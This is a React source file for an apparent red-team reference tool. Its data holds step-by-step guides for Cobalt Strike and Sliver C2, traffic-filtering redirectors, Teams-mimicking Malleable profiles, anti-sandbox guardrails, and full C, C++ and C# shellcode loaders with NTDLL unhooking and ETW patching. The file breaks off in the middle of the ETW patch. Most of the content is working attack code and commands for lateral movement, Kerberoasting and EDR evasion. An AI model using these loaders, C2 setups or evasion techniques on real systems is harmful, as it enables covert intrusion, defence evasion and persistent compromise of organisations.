import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { X, Plus } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'C2',
    color: 'cyan',
    nodes: [
      { title: 'Cobalt Strike', subtitle: 'Team server • listeners • Beacon tasking', id: 'cobalt-strike' },
      { title: 'Sliver', subtitle: 'HTTPS • DNS • WireGuard • MTLS implants', id: 'sliver' },
    ]
  },
  {
    header: 'INFRASTRUCTURE',
    color: 'blue',
    nodes: [
      { title: 'Redirectors', subtitle: 'NGINX • Apache • Socat • CDN fronting', id: 'redirectors' },
      { title: 'Traffic Control', subtitle: 'UA • Cookie • URI filters • Malleable C2', id: 'traffic-control' },
      { title: 'Beacon & Certs', subtitle: 'TLS certs • DNS redirect • JARM evasion', id: 'beacon-certs' },
      { title: 'Payload Guardrails', subtitle: 'Environment keying • anti-sandbox', id: 'guardrails' },
    ]
  },
  {
    header: 'PAYLOADS',
    color: 'green',
    nodes: [
      { title: 'BOFs & Extensions', subtitle: 'In-process COFF • Sliver Armory • kits', id: 'bofs' },
      { title: 'Shellcode Runners', subtitle: 'C/C++/C# loaders • AES decrypt • RW→RX', id: 'shellcode-runners' },
      { title: 'OPSEC Principles', subtitle: 'Footprint control • ETW • AMSI • planning', id: 'opsec' },
    ]
  },
];

const techniques = [
  // ── C2 ──────────────────────────────────────────────────────────────────────
  {
    id: 'cobalt-strike',
    title: 'Cobalt Strike — Team Server, Listeners & Beacon Tasking',
    subtitle: 'Complete Cobalt Strike setup from team server hardening through listener creation, payload generation, and in-engagement tasking',
    tags: ['Cobalt Strike', 'Beacon', 'team server', 'HTTPS listener', 'DNS listener', 'SMB listener', 'stageless', 'sleep/jitter', 'execute-assembly', 'BOF'],
    accentColor: 'cyan',
    overview: 'Cobalt Strike is the industry-standard red team C2 framework. A team server hosts listeners and coordinates operators; Beacons check in on configurable intervals and execute tasks asynchronously. The team server should never be internet-facing — it sits behind one or more redirectors. All engagement-critical OPSEC configuration happens immediately on Beacon check-in: sleep/jitter, spawnto, and PPID spoofing.',
    steps: [
      'Deploy team server on a hardened VPS behind a redirector — never expose team server IP; restrict port 50050 to operator IPs via firewall',
      'Validate the Malleable C2 profile with c2lint before starting the server — a bad profile causes Beacon to fail silently on first callback',
      'Create an HTTPS listener pointing to the redirector domain (not the team server IP); configure host header to match the profile',
      'Create a DNS listener as a fallback for low-and-slow comms when HTTPS is blocked: configure NS delegation records',
      'Create SMB and TCP listeners for internal pivoting — bind-style, no outbound internet required from chained Beacons',
      'Generate stageless payloads (EXE, DLL, raw shellcode) — staged payloads are detectable/blockable by modern proxies',
      'Set sleep/jitter immediately after check-in: sleep 60 20 (60s ± 20% jitter)',
      'Set spawnto before any fork-and-run tasks — never leave it as the default rundll32.exe',
      'Prefer BOFs (inline-execute) over execute-assembly for sensitive tasks — no new process, no CLR load',
    ],
    commands: [
      {
        title: 'Team server startup and listener creation',
        code: `# Start team server — firewall 50050 to operator IPs only
sudo ufw allow from <OPERATOR_IP> to any port 50050
./teamserver <TEAMSERVER_IP> <PASSWORD> /path/to/profile.profile

# Connect via SSH tunnel (keeps 50050 off the internet)
ssh -L 50050:127.0.0.1:50050 user@teamserver-vps
# Connect Cobalt Strike GUI to 127.0.0.1:50050

# === HTTPS Listener ===
# GUI → Listeners → Add
#   Payload: windows/beacon_https/reverse_https
#   Host:    cdn-redirector.yourdomain.com   ← redirector domain
#   Port:    443

# === DNS Listener (fallback) ===
#   Payload: windows/beacon_dns/reverse_dns_txt
#   DNS Hosts: beacon.yourdomain.com
#   Port:    53

# === SMB Pivot Listener ===
#   Payload: windows/beacon_smb/bind_pipe
#   Pipe:    msagent_##`
      },
      {
        title: 'Beacon tasking and post-check-in OPSEC',
        code: `# === IMMEDIATELY on new Beacon check-in ===
# 1. Set spawnto BEFORE any fork-and-run
spawnto x64 %windir%\\sysnative\\dllhost.exe
spawnto x86 %windir%\\syswow64\\dllhost.exe

# 2. Set sleep/jitter
sleep 60 25        # 60s ± 25%

# In-process recon (BOF preferred over shell)
ps                 # Process list (no new process)
getuid             # Current user token
screenshot         # Desktop screenshot

# Fork-and-run .NET (spawns sacrificial process — use sparingly)
execute-assembly /tools/Rubeus.exe kerberoast /nowrap
execute-assembly /tools/Seatbelt.exe -group=all
execute-assembly /tools/SharpHound.exe --CollectionMethods All

# Lateral movement
jump psexec64 TARGET.corp.local HTTPS-Corp
jump winrm64  TARGET.corp.local HTTPS-Corp
jump wmi      TARGET.corp.local HTTPS-Corp

# SMB pivot (connect to existing beacon on internal host)
link TARGET.corp.local msagent_01
connect TARGET.corp.local 4444`
      }
    ]
  },
  {
    id: 'sliver',
    title: 'Sliver — Server Setup, Implant Generation & Tasking',
    subtitle: 'Open-source C2 framework with HTTPS, DNS, WireGuard, and MTLS transports — full setup and operational use',
    tags: ['Sliver', 'HTTPS', 'DNS', 'WireGuard', 'MTLS', 'implant', 'session', 'armory', 'in-process', 'execute-assembly'],
    accentColor: 'cyan',
    overview: 'Sliver is an open-source C2 framework with built-in operator isolation — each operator gets a unique WireGuard config. Implants support four transports: HTTPS, DNS, WireGuard, and MTLS. The Armory package manager provides one-command installation of community extensions (Rubeus, Seatbelt, SharpHound). execute-assembly --in-process loads .NET tools directly into the implant without spawning a child process.',
    steps: [
      'Install Sliver server on a VPS and generate per-operator WireGuard configs with new-operator',
      'Start HTTPS listener with a real Let\'s Encrypt cert on the callback domain',
      'Generate implants with matching transport, sleep, and jitter settings at generation time',
      'Set sleep/jitter immediately on every new session before issuing any commands',
      'Use execute-assembly --in-process for all .NET tool execution — no new process spawned',
      'Use Armory extensions for common tools (rubeus, seatbelt, sharpview) — run in-process automatically',
      'Use DNS or WireGuard implants in highly monitored environments where HTTPS is inspected',
    ],
    commands: [
      {
        title: 'Server setup and implant generation',
        code: `# Install and start Sliver
curl https://sliver.sh/install | sudo bash
sudo systemctl start sliver
sliver-server

# Generate per-operator config
sliver > new-operator --name op1 --lhost YOUR_VPS_IP --save /tmp/op1.cfg

# Start HTTPS listener (use real LE cert)
sliver > https --lhost 0.0.0.0 --lport 443 --domain yourdomain.com \\
  --cert /etc/letsencrypt/live/yourdomain.com/cert.pem \\
  --key  /etc/letsencrypt/live/yourdomain.com/privkey.pem

# Generate implants
sliver > generate --os windows --arch amd64 --format exe \\
  --http yourdomain.com --sleep 60 --jitter 25 --name corp-implant

# DLL (for sideloading)
sliver > generate --os windows --arch amd64 --format dll \\
  --http yourdomain.com --name sideload.dll

# DNS (low-and-slow fallback)
sliver > generate --os windows --arch amd64 --format exe \\
  --dns yourdomain.com --sleep 120 --jitter 30 --name dns-fallback

# WireGuard (no HTTP fingerprint at all)
sliver > generate --os windows --arch amd64 --format exe \\
  --wg yourdomain.com:51820 --name wg-implant`
      },
      {
        title: 'Session tasking',
        code: `# List and interact with sessions
sliver > sessions
sliver > use corp-implant

# === IMMEDIATELY on new session ===
sliver (corp-implant) > sleep 60s --jitter 25

# Host recon
sliver (corp-implant) > info           # Implant info, user, PID, OS
sliver (corp-implant) > whoami         # Current user + token
sliver (corp-implant) > ps             # Process list
sliver (corp-implant) > netstat        # Network connections
sliver (corp-implant) > screenshot     # Desktop capture

# In-process .NET execution (no new process — OPSEC preferred)
sliver (corp-implant) > execute-assembly --in-process /tools/Rubeus.exe kerberoast
sliver (corp-implant) > execute-assembly --in-process /tools/Seatbelt.exe -group=all
sliver (corp-implant) > execute-assembly --in-process /tools/SharpHound.exe --CollectionMethods All

# Armory extensions (in-process)
sliver (corp-implant) > rubeus kerberoast
sliver (corp-implant) > seatbelt -group=all

# File operations
sliver (corp-implant) > ls C:\\Users\\
sliver (corp-implant) > download C:\\Users\\user\\Documents\\file.txt
sliver (corp-implant) > upload /local/tool.exe C:\\Windows\\Temp\\svc.exe

# Lateral movement
sliver (corp-implant) > psexec --hostname TARGET.corp.local \\
  --service-name "WinUpdate" --exe /tmp/corp-implant.exe`
      }
    ]
  },

  // ── INFRASTRUCTURE ──────────────────────────────────────────────────────────
  {
    id: 'redirectors',
    title: 'Redirectors — C2 Infrastructure Hardening',
    subtitle: 'Deploy filtering redirectors between beacon callbacks and the team server',
    tags: ['redirector', 'NGINX', 'Apache mod_rewrite', 'Socat', 'CDN', 'iptables', 'firewall rules'],
    accentColor: 'blue',
    overview: 'Redirectors are lightweight, expendable VPS nodes that sit between implants and the team server. They proxy valid C2 traffic to the team server while blocking or redirecting everything else. If a redirector IP is burned, swap it out in minutes without disrupting active sessions. The team server must never accept direct inbound connections from the internet.',
    steps: [
      'Provision a cheap VPS on a separate provider for the redirector — keep providers diverse',
      'Firewall the team server to accept inbound C2 traffic only from the redirector IP on port 443',
      'Install NGINX or Apache on the redirector with a Let\'s Encrypt cert for the callback domain',
      'Write location/RewriteRule blocks: forward only URI paths matching the Malleable profile, redirect everything else to a decoy site',
      'For a minimal TCP relay with no filtering, use socat as a quick setup option',
      'Test the filter rules before the engagement: confirm beacon traffic flows through but scanner traffic is redirected',
    ],
    commands: [
      {
        title: 'NGINX reverse proxy redirector',
        code: `# /etc/nginx/sites-available/redirector.conf
server {
    listen 443 ssl;
    server_name cdn-redirector.yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/cdn-redirector.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-redirector.yourdomain.com/privkey.pem;

    # Only proxy requests matching Malleable C2 URIs
    location ~* ^/(api/v1/users|update|cdn-status) {
        proxy_pass         https://TEAMSERVER_IP:443;
        proxy_ssl_verify   off;
        proxy_set_header   Host              $host;
        proxy_set_header   X-Forwarded-For   $remote_addr;
    }

    # Everything else — decoy redirect
    location / {
        return 301 https://microsoft.com$request_uri;
    }
}
ln -s /etc/nginx/sites-available/redirector.conf /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx`
      },
      {
        title: 'Socat TCP relay and team server firewall',
        code: `# Socat — minimal TCP redirector (no filtering)
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:TEAMSERVER_IP:443 &

# Persistent via systemd
cat > /etc/systemd/system/socat-redir.service << 'EOF'
[Unit]
Description=Socat C2 Redirector
After=network.target
[Service]
ExecStart=/usr/bin/socat TCP4-LISTEN:443,fork,reuseaddr TCP4:TEAMSERVER_IP:443
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now socat-redir

# iptables on the TEAM SERVER — accept only from redirector
iptables -F INPUT
iptables -A INPUT -s REDIRECTOR_IP -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -s OPERATOR_IP   -p tcp --dport 50050 -j ACCEPT
iptables -A INPUT -p tcp --dport 50050 -j DROP
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -s OPERATOR_IP -j ACCEPT
iptables -A INPUT -j DROP
iptables-save > /etc/iptables/rules.v4`
      }
    ]
  },
  {
    id: 'traffic-control',
    title: 'Traffic Control — Malleable C2 Profiles & Filtering',
    subtitle: 'Configure every byte of Beacon HTTP/S traffic and redirector filter rules to blend with legitimate applications',
    tags: ['Malleable C2', 'c2lint', 'User-Agent filter', 'URI filter', 'Cookie filter', 'JARM', 'JA3', 'traffic blending'],
    accentColor: 'blue',
    overview: 'Malleable C2 profiles control every byte of Cobalt Strike Beacon HTTP/S traffic — URIs, HTTP headers, cookie format, POST body encoding, and server response structure. The goal is C2 traffic indistinguishable from a known legitimate application. Complementary redirector filter rules ensure only genuine beacon traffic reaches the team server — scanners and analysts get a decoy response.',
    steps: [
      'Choose a realistic application to mimic: Teams, O365, Akamai CDN — match its exact User-Agent and URI patterns',
      'Set the Malleable profile User-Agent, http-get URI, http-post URI, and all headers to match the chosen application precisely',
      'Use prepend/append in http-get/http-post to bury C2 metadata in plausible JSON or cookie values',
      'Set post-ex block: spawnto, pipename, ppid, obfuscate, amsi_disable',
      'Validate with c2lint before every deployment — any profile error causes Beacon to fail silently',
      'Configure redirector filter rules: require the exact Malleable User-Agent, matching URI, and a session cookie beacon always sends',
      'Check JARM fingerprint after deploy with a scanner — use a real LE cert to change from the default CS fingerprint',
    ],
    commands: [
      {
        title: 'Malleable C2 profile — Microsoft Teams mimic',
        code: `# teams.profile — example profile
set sleeptime "45000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Teams/1.6.00.27573 Chrome/102.0.5005.167";

http-get {
    set uri "/api/v1/users/8:live:.cid.abc123ef456ab789/activities";
    client {
        header "Accept"          "application/json, text/plain, */*";
        header "Cache-Control"   "no-cache";
        header "Host"            "teams.microsoft.com";
        metadata {
            base64url;
            prepend "oc-v2=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type"  "application/json; charset=utf-8";
        output {
            base64url;
            prepend "{\"value\":[{\"activityId\":\"";
            append "\",\"type\":\"activity\"}]}";
            print;
        }
    }
}

post-ex {
    set spawnto_x64  "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86  "%windir%\\syswow64\\dllhost.exe";
    set pipename     "msrpc_#####";
    set ppid         "explorer.exe";
    set obfuscate    "true";
    set amsi_disable "true";
}

# Validate before use — REQUIRED
./c2lint teams.profile`
      },
      {
        title: 'Multi-layer redirector traffic filtering',
        code: `# Apache mod_rewrite — combined URI + User-Agent + Cookie filter
RewriteEngine On

# Require specific URI
RewriteCond %{REQUEST_URI} !^(/api/v1/users|/update|/cdn-status)
RewriteRule .* https://microsoft.com/? [L,R=302]

# Require exact User-Agent (must match Malleable profile)
RewriteCond %{HTTP_USER_AGENT} !"Mozilla/5.0.*Teams/1.6" [NC]
RewriteRule .* https://microsoft.com/? [L,R=302]

# Require session cookie beacon always sends
RewriteCond %{HTTP_COOKIE} !oc-v2=
RewriteRule .* https://microsoft.com/? [L,R=302]

# Block known AV/sandbox IP ranges
RewriteCond %{REMOTE_ADDR} ^(54\\.187\\.|108\\.170\\.)
RewriteRule .* https://microsoft.com/? [L,R=302]

# Forward matching traffic to team server
RewriteRule ^(.*)$ https://TEAMSERVER_IP:443%{REQUEST_URI} [P,L]`
      }
    ]
  },
  {
    id: 'beacon-certs',
    title: 'Beacon TLS Certificates & DNS Redirection',
    subtitle: 'Configure legitimate TLS certificates and DNS delegation for beacon callbacks',
    tags: ["Let's Encrypt", 'Java keystore', 'TLS', 'DNS redirect', 'JARM', 'NS delegation'],
    accentColor: 'blue',
    overview: 'TLS certificates and DNS configuration control how beacon traffic appears to defenders. Using a Let\'s Encrypt certificate and a properly aged, categorised domain changes the JARM fingerprint away from the Cobalt Strike default and makes the callback domain look legitimate to reputation databases.',
    steps: [
      'Register a callback domain with 6+ months age; categorise it as Business/Technology in URL reputation databases before the engagement',
      'Obtain a Let\'s Encrypt certificate for the callback domain using certbot — never use self-signed certs (triggers TLS alerts)',
      'Convert the LE certificate to a Java keystore (.store) and reference it in the Malleable https-certificate block',
      'For DNS beacons: delegate a subdomain NS record to the team server IP at the domain registrar',
      'Configure the CS DNS listener with the delegated subdomain as DNS Host; verify with dig NS',
      'Generate fresh domains and certificates per engagement — never reuse infrastructure across engagements',
    ],
    commands: [
      {
        title: 'Certificate setup for Cobalt Strike',
        code: `# Let's Encrypt certificate
certbot certonly --standalone -d yourdomain.com

# Convert to Java keystore (required for CS profile)
openssl pkcs12 -export \\
  -in  /etc/letsencrypt/live/yourdomain.com/fullchain.pem \\
  -inkey /etc/letsencrypt/live/yourdomain.com/privkey.pem \\
  -out domain.p12 -passout pass:changeit

keytool -importkeystore \\
  -srckeystore domain.p12 -srcstoretype PKCS12 -srcstorepass changeit \\
  -destkeystore domain.store -deststoretype JKS -deststorepass changeit

# Reference in Malleable C2 profile
https-certificate {
    set keystore "domain.store";
    set password "changeit";
}

# DNS delegation — configure at domain registrar
# ns1.yourdomain.com   A     <TEAMSERVER_IP>
# beacon.yourdomain.com NS   ns1.yourdomain.com

# CS DNS listener
# Listeners → Add → windows/beacon_dns/reverse_dns_txt
# DNS Hosts: beacon.yourdomain.com

# Verify NS delegation
dig NS beacon.yourdomain.com
dig A ns1.yourdomain.com

# Check JARM fingerprint (compare to real Teams)
python3 jarm.py yourdomain.com:443`
      }
    ]
  },
  {
    id: 'guardrails',
    title: 'Payload Guardrails & Anti-Sandbox',
    subtitle: 'Restrict payload execution to the target environment — useless if analyzed outside it',
    tags: ['guardrails', 'environment keying', 'anti-sandbox', 'domain check', 'IP check', 'uptime check'],
    accentColor: 'blue',
    overview: 'Payload guardrails are conditions that must be true for the payload to execute, preventing analysis outside the target environment. A sandboxed analyst running the payload will exit harmlessly — the real shellcode only decrypts and executes when all environmental checks pass.',
    steps: [
      'Check domain membership: only execute if the machine is joined to the target domain (CORP.LOCAL)',
      'Check source IP range: only continue if the public IP matches the target organisation\'s known ranges',
      'Check system resources: exit if CPU cores < 2, RAM < 2GB, or uptime < 10 minutes (sandbox indicators)',
      'Check for analysis tools: exit if procmon, wireshark, vmtoolsd, or vboxservice are running',
      'Stack multiple checks — domain + IP + uptime + resource checks combined give high confidence of a real target',
      'Combine with redirector IP filtering: only target IPs can even download the stager from the redirector',
    ],
    commands: [
      {
        title: 'Payload guardrails implementation',
        code: `# PowerShell guardrails (run before any payload execution)
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if ($domain -ne "corp.local") { exit }

# IP range check
$ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
if ($ip -notmatch "^203\\.0\\.113\\.") { exit }

# Sandbox detection (combine all checks)
if (
    (Get-CimInstance Win32_Processor).NumberOfCores -lt 2 -or
    (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB -or
    [System.Environment]::TickCount -lt 600000 -or
    (Get-Process | Where-Object { $_.Name -in @("procmon","wireshark","vmtoolsd","vboxservice") })
) { exit }

# C guardrail (compiled into loader)
char domain[256]; DWORD size = 256;
GetComputerNameExA(ComputerNameDnsDomain, domain, &size);
if (_stricmp(domain, "corp.local") != 0) ExitProcess(0);`
      }
    ]
  },

  // ── MALWARE ──────────────────────────────────────────────────────────────────
  {
    id: 'bofs',
    title: 'BOFs, Kits & Sliver Extensions',
    subtitle: 'In-process execution with Cobalt Strike BOFs and Sliver extensions — replace noisy fork-and-run with OPSEC-safe alternatives',
    tags: ['BOF', 'COFF', 'Artifact Kit', 'Resource Kit', 'Sliver extensions', 'Armory', 'in-process', 'inline-execute'],
    accentColor: 'green',
    overview: 'BOFs (Beacon Object Files) are position-independent COFF objects that execute in-process within Cobalt Strike\'s Beacon — no child process is spawned, no .NET CLR is loaded, no new network connections. They represent the highest-OPSEC execution primitive available. Sliver\'s equivalent is in-process extension loading via execute-assembly --in-process or Armory extensions. The Artifact Kit replaces CS\'s default shellcode stubs with custom ones that defeat AV signatures on stager delivery.',
    steps: [
      'Prefer BOFs (CS inline-execute) and --in-process extensions (Sliver) over fork-and-run for all sensitive tasks',
      'Compile custom BOFs with MinGW cross-compiler: x86_64-w64-mingw32-gcc -o mybof.o -c mybof.c',
      'Use the TrustedSec BOF Collection for common tasks: ps, netscan, reg-query, whoami',
      'Load Artifact Kit to replace CS default shellcode stubs with custom templates that defeat public AV signatures',
      'Use Resource Kit to customise script-based delivery templates (PowerShell, VBA, HTA)',
      'Install Sliver Armory extensions with armory install all — all run in-process automatically',
    ],
    commands: [
      {
        title: 'Cobalt Strike BOF usage and Artifact Kit',
        code: `# Compile a BOF
x86_64-w64-mingw32-gcc -o mybof.o -c mybof.c -masm=intel -Wall

# Execute BOF in-process (no new process spawned)
inline-execute /path/to/mybof.o
inline-execute /path/to/mybof.o arg1 arg2

# Common BOFs from TrustedSec BOF Collection
inline-execute /tools/bofs/ps.o             # Process listing
inline-execute /tools/bofs/netscan.o        # Port scanner
inline-execute /tools/bofs/reg-query.o      # Registry query
inline-execute /tools/bofs/whoami.o         # WhoAmI

# Artifact Kit — custom beacon stubs
cd arsenal-kit/kits/artifact/
./build.sh pipe VirtualAlloc 296948 5 false false none /tmp/artifact_out/
# Load: Script Manager → Load /tmp/artifact_out/artifact.cna

# Resource Kit — customise script templates
cd arsenal-kit/kits/resource/
./build.sh /tmp/resource_out/`
      },
      {
        title: 'Sliver Armory extensions',
        code: `# Install all Armory extensions
sliver > armory install all
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > extensions list

# Use extensions in session (run in-process)
sliver (session) > rubeus kerberoast
sliver (session) > seatbelt -group=all
sliver (session) > sharpview Get-DomainUser -SPN

# execute-assembly --in-process (loads CLR into implant, no fork)
sliver (session) > execute-assembly --in-process /tools/SharpHound.exe --CollectionMethods All
sliver (session) > execute-assembly --in-process /tools/Certify.exe find /vulnerable

# BOF execution (Sliver 1.5.40+)
sliver (session) > execute-bof /tools/bofs/ps.o`
      }
    ]
  },
  {
    id: 'shellcode-runners',
    title: 'Shellcode Runners — C, C++, and C# Loaders',
    subtitle: 'Write custom shellcode loaders and implants for maximum EDR evasion when CS/Sliver signatures are burned',
    tags: ['custom loader', 'C shellcode runner', 'AES decrypt', 'VirtualAlloc', 'syscalls', 'NTDLL unhooking', 'sleep obfuscation', 'D/Invoke'],
    accentColor: 'green',
    overview: 'Custom shellcode runners become necessary when Cobalt Strike or Sliver default stubs are detected by EDR — a unique binary compiled per-engagement has no public YARA/AV signatures. C loaders using the Windows CryptoAPI for AES decryption are highly portable. C++ adds compile-time string obfuscation and NTDLL unhooking. C# with D/Invoke replaces P/Invoke IAT entries with runtime resolution, bypassing import-table-based detection. All approaches end in: RW allocation → copy decrypted shellcode → RX flip → thread.',
    steps: [
      'Generate stageless shellcode (.bin) from CS or Sliver — encrypt it offline with AES-256',
      'Build a C loader: allocate RW memory, copy encrypted shellcode, decrypt via CryptoAPI, flip to RX, CreateThread',
      'Avoid RWX allocations — allocate RW, write, then VirtualProtect to RX (two-step)',
      'For C++: add NTDLL unhooking (fresh copy from disk) and compile-time XOR string obfuscation',
      'For C#: replace P/Invoke with D/Invoke delegates for all sensitive API calls to avoid import table detection',
      'Use SysWhispers3 or HellsGate for direct/indirect syscalls to bypass NTDLL userland hooks',
      'Add sleep obfuscation: encrypt beacon in memory during sleep (RC4/AES) to prevent memory scanning',
    ],
    commands: [
      {
        title: 'C shellcode loader with AES decryption',
        code: `// loader.c — minimal C shellcode loader with AES-256 CBC decrypt
// Compile: x86_64-w64-mingw32-gcc -o loader.exe loader.c -ladvapi32 -s -O2

#include <windows.h>
#include <wincrypt.h>

void aes_decrypt(BYTE *data, DWORD *data_len, BYTE *key, BYTE *iv) {
    HCRYPTPROV hProv; HCRYPTKEY hKey; HCRYPTHASH hHash;
    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, 32, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    CryptDecrypt(hKey, 0, TRUE, 0, data, data_len);
    CryptDestroyKey(hKey); CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
}

int main(void) {
    BYTE key[32] = { /* 32 random bytes */ };
    BYTE iv[16]  = { /* 16 random bytes */ };
    BYTE enc_sc[] = { /* encrypted shellcode */ };
    DWORD sc_len = sizeof(enc_sc);

    aes_decrypt(enc_sc, &sc_len, key, iv);

    // RW → write → RX → thread (never RWX directly)
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, enc_sc, sc_len);
    DWORD old;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);
    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(h, INFINITE);
    return 0;
}`
      },
      {
        title: 'C++ loader with NTDLL unhooking',
        code: `// C++ loader — NTDLL unhooking + compile-time XOR string obfuscation
// Compile: x86_64-w64-mingw32-g++ -o loader.exe loader.cpp -O2 -s -std=c++17

// Compile-time XOR string obfuscation
template<size_t N>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N], char k) {
        for (size_t i = 0; i < N; i++) data[i] = s[i] ^ k;
    }
    std::string decrypt(char k) const {
        std::string r(data, N-1);
        for (auto& c : r) c ^= k;
        return r;
    }
};
#define OBF(s) (ObfStr<sizeof(s)>(s, 0x41).decrypt(0x41))
// Usage: auto lib = OBF("ntdll.dll");

void unhook_ntdll() {
    HANDLE hFile = CreateFileW(L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap  = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID fresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS  nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID dst = (BYTE*)hNtdll + sec->VirtualAddress;
            LPVOID src = (BYTE*)fresh   + sec->VirtualAddress;
            VirtualProtect(dst, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dst, src, sec->Misc.VirtualSize);
            VirtualProtect(dst, sec->Misc.VirtualSize, old, &old);
        }
    }
    UnmapViewOfFile(fresh); CloseHandle(hMap); CloseHandle(hFile);
}`
      },
      {
        title: 'C# loader with D/Invoke (no P/Invoke import table)',
        code: `// C# loader — D/Invoke replaces P/Invoke, eliminates import table entries
// Compile: csc /unsafe /out:loader.exe loader.cs
// Reference: https://github.com/TheWover/DInvoke

using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

class Loader {
    // Delegate types — no [DllImport] entries in the IAT
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(IntPtr addr, uint size, uint type, uint prot);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool VirtualProtectDelegate(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThreadDelegate(IntPtr sa, uint size, IntPtr start, IntPtr param, uint flags, out uint tid);

    static void Main() {
        byte[] encSc = new byte[] { /* encrypted shellcode bytes */ };
        byte[] key   = new byte[] { /* 32-byte AES key */ };
        byte[] iv    = new byte[] { /* 16-byte IV */ };

        // Decrypt AES-256-CBC in memory
        byte[] sc = AesDecrypt(encSc, key, iv);

        // Resolve APIs dynamically — no import table footprint
        var alloc   = Generic.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
        var protect = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
        var create  = Generic.GetLibraryAddress("kernel32.dll", "CreateThread");

        var pAlloc   = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(alloc);
        var pProtect = Marshal.GetDelegateForFunctionPointer<VirtualProtectDelegate>(protect);
        var pCreate  = Marshal.GetDelegateForFunctionPointer<CreateThreadDelegate>(create);

        // RW → write → RX → execute
        IntPtr mem = pAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04); // PAGE_READWRITE
        Marshal.Copy(sc, 0, mem, sc.Length);
        pProtect(mem, (UIntPtr)sc.Length, 0x20, out _);                   // PAGE_EXECUTE_READ
        pCreate(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out _);
        System.Threading.Thread.Sleep(-1);
    }
}`
      },
      {
        title: 'NTDLL unhooking and ETW/AMSI patching',
        code: `// NTDLL unhooking — load fresh copy from disk to bypass EDR hooks
void unhook_ntdll() {
    HANDLE hFile = CreateFileW(L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID freshNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID dst = (BYTE*)hNtdll + sec->VirtualAddress;
            LPVOID src = (BYTE*)freshNtdll + sec->VirtualAddress;
            VirtualProtect(dst, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dst, src, sec->Misc.VirtualSize);
            VirtualProtect(dst, sec->Misc.VirtualSize, old, &old);
        }
    }
    UnmapViewOfFile(freshNtdll); CloseHandle(hMap); CloseHandle(hFile);
}

// ETW patch — EtwEventWrite → RET
void patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC addr = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
